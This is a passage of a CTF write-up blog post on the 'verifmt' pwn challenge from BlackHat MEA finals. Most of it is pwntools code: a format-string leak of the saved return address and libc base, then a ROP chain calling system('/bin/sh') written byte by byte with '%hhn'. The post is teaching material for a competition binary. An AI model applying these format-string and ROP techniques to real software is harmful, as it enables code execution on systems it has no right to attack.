</div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">send([rip], </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">%s</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">libc.address </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(io.recvline().strip().ljust(</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2a1ca</span><span style="--0:#24292E;--1:#E1E4E8"> ; </span><span style="--0:#BF3441;--1:#F97583">break</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">except</span><span style="--0:#24292E;--1:#E1E4E8">: </span><span style="--0:#BF3441;--1:#F97583">continue</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">log.info(</span><span style="--0:#005CC5;--1:#79B8FF">hex</span><span style="--0:#24292E;--1:#E1E4E8">(libc.address))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="while True:    try:        io = process()        send([0], f&#34;%*7$&#34;.encode())        rip = ((0x7fff<<32) | (int(io.recvline().decode().strip()[1:]) &#38; 0xFFFFFFFF)) + 0x170        send([rip], b'%s')        libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x2a1ca ; break    except: continuelog.info(hex(libc.address))"><div></div></button></div></figure></div>
<p>We are leaking the address in the saved rip by using <code>%s</code> which takes an address and prints from that address until it reaches ‘\x00’.</p>
<p>Running the following script we can get a libc leak:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:101ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exe </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> context.binary </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(args.</span><span style="--0:#005CC5;--1:#79B8FF">EXE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">or</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;./chall&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(exe.libc.path)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">send</span><span style="--0:#24292E;--1:#E1E4E8">(arguments, fmt):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# of args: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">str</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(arguments)).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">range</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(arguments)): io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[</span><span style="--0:#005CC5;--1:#79B8FF">{</span><span style="--0:#24292E;--1:#E1E4E8">i</span><span style="--0:#005CC5;--1:#79B8FF">}</span><span style="--0:#032F62;--1:#9ECBFF">]: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">.encode(), </span><span style="--0:#005CC5;--1:#79B8FF">str</span><span style="--0:#24292E;--1:#E1E4E8">(arguments[i]).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;string: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, fmt)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> process()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">try</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> process()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">send([</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;%*7$&quot;</span><span style="--0:#24292E;--1:#E1E4E8">.encode())</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">rip </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ((</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">7fff</span><span style="--0:#BF3441;--1:#F97583">&lt;&lt;</span><span style="--0:#005CC5;--1:#79B8FF">32</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">int</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().decode().strip()[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">:]) </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">FFFFFFFF</span><span style="--0:#24292E;--1:#E1E4E8">)) </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">170</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">send([rip], </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">%s</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">libc.address </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(io.recvline().strip().ljust(</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2a1ca</span><span style="--0:#24292E;--1:#E1E4E8"> ; </span><span style="--0:#BF3441;--1:#F97583">break</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">except</span><span style="--0:#24292E;--1:#E1E4E8">: </span><span style="--0:#BF3441;--1:#F97583">continue</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">log.info(</span><span style="--0:#005CC5;--1:#79B8FF">hex</span><span style="--0:#24292E;--1:#E1E4E8">(libc.address))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">gdb.attach(io)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *exe = context.binary = ELF(args.EXE or './chall')libc = ELF(exe.libc.path)def send(arguments, fmt):    io.sendlineafter(b&#34;# of args: &#34;, str(len(arguments)).encode())    for i in range(len(arguments)): io.sendlineafter(f&#34;[{i}]: &#34;.encode(), str(arguments[i]).encode())    io.sendlineafter(b&#34;string: &#34;, fmt)io = process()while True:    try:        io = process()        send([0], f&#34;%*7$&#34;.encode())        rip = ((0x7fff<<32) | (int(io.recvline().decode().strip()[1:]) &#38; 0xFFFFFFFF)) + 0x170        send([rip], b'%s')        libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x2a1ca ; break    except: continuelog.info(hex(libc.address))gdb.attach(io)io.interactive()"><div></div></button></div></figure></div>
<p><img src="/other-files/libc-leak.CqUtYQya_Z2nsAJx.webp" alt width="1806" height="815" loading="lazy" decoding="async"></p>
<p>From here it’s straightforward—we build a rop chain to perform ret2system and overwrite the saved rip with that chain:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:73ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">pop rdi ; ret ==&gt; rdi = ptr to /bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">system(&amp;cmd)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;&#39;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">next</span><span style="--0:#24292E;--1:#E1E4E8">(libc.search(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2882f</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.system)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">range</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(rop)</span><span style="--0:#BF3441;--1:#F97583">//</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">target </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(rop[(i</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">):((i</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">)])</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> j </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">range</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">6</span><span style="--0:#24292E;--1:#E1E4E8">):</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">send([((target </span><span style="--0:#BF3441;--1:#F97583">&gt;&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> (j</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">)) </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">ff</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">, rip</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8">(i</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8">j], </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%*x</span><span style="--0:#032F62;--1:#9ECBFF"> %hhn&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="&#34;&#34;&#34;pop rdi ; ret ==> rdi = ptr to /bin/sh\x00retsystem(&#38;cmd)&#34;&#34;&#34;rop  = b''rop += p64(libc.address + 0x10f78b)rop += p64(next(libc.search(b&#34;/bin/sh\x00&#34;)))rop += p64(libc.address + 0x2882f)rop += p64(libc.sym.system)for i in range(len(rop)//8):    target = u64(rop[(i*8):((i+1)*8)])    for j in range(6):        send([((target >> (j*8)) &#38; 0xff)-1, 0, rip+(i*8)+j], b&#34;%*x %hhn&#34;)"><div></div></button></div></figure></div>
<p>For those unfamiliar with format string exploitation: this code iterates through each 8-byte gadget in the ROP chain and writes it byte-by-byte to <code>rip+(i*8)+j</code>. We have a <code>0</code> here because <code>%*x</code> consumes two values—the first as width and the second to print. So it prints <code>((target &gt;&gt; (j*8)) &amp; 0xff)-1</code> spaces and then <code>0</code>, making the total bytes printed <code>(target &gt;&gt; (j*8)) &amp; 0xff</code> (the <code>-1</code> cancels out). Then <code>%hhn</code> writes this byte count to our target address <code>rip+(i*8)+j</code>.</p>
<p>Once we have overwritten the rip we can send <code>-</code> to make scanf() error out and make the code return:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:30ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendline(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;-&quot;</span><span style="--0:#24292E;--1:#E1E4E8">) ; io.clean()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="io.sendline(b&#34;-&#34;) ; io.clean()io.interactive()"><div></div></button></div></figure></div>
<p><img src="/other-files/shell.CHssEknR_Zw0Gw5.webp" alt width="1115" height="477" loading="lazy" decoding="async"></p>
<p>You can find the full script <a href="https://github.com/z0v3r1n/ctf-scripts/blob/main/blackhat-finals/verifmt/xpl.py" rel="nofollow noreferrer noopener" target="_blank">here</a>.</p>
<h3 id="conclusion">Conclusion</h3>
<p>This challenge demonstrated an interesting approach to format string exploitation with restricted positional arguments.
Thanks to ptr-yudai for the great challenge and BlackHat MEA for the great event!</p> </article>  <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/buckeye-2025_bashtille#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" viewBox="0 0 24 24" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Buckeye 2025 – pwn/bashtille </span> </div>  </a>  <a href="#" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full pointer-events-none opacity-50 cursor-not-allowed" aria-disabled="true">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> You&#39;re at the newest post! </span> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <button data-slot="button" class="items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9 group fixed right-8 bottom-8 z-50 hidden" id="scroll-to-top" title="Scroll to top" aria-label="Scroll to top"> <svg width="1em" height="1em" class="mx-auto size-4 transition-all group-hover:-translate-y-0.5" data-icon="lucide:arrow-up">   <symbol id="ai:lucide:arrow-up" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12l7-7l7 7m-7 7V5"/></symbol><use href="#ai:lucide:arrow-up"></use>  </svg> </button> <script type="module">if(document.querySelector(".katex")&&!document.querySelector('link[href*="katex.min.css"]')){const e=document.createElement("link");e.rel="stylesheet",e.href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css",document.head.appendChild(e)}</script>  </main> <footer class="mx-auto mb-8 flex w-full max-w-3xl flex-col items-center justify-center gap-y-2 px-4 sm:mb-4 sm:flex-row sm:justify-between"> <div class="flex flex-wrap items-center justify-center gap-x-2 text-center"> <span class="text-muted-foreground text-sm">
&copy; 2025 z0v3r1n
</span> </div> <ul class="flex flex-wrap gap-2" role="list"> <li> <a href="https://github.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="GitHub" title="GitHub">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:github">   <symbol id="ai:lucide:github" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5c.08-1.25-.27-2.48-1-3.5c.28-1.15.28-2.35 0-3.5c0 0-1 0-3 1.5c-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.4 5.4 0 0 0 4 9c0 3.5 3 5.5 6 5.5c-.39.49-.68 1.05-.85 1.65S8.93 17.38 9 18v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></g></symbol><use href="#ai:lucide:github"></use>  </svg>  </a> </li><li> <a href="https://x.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] 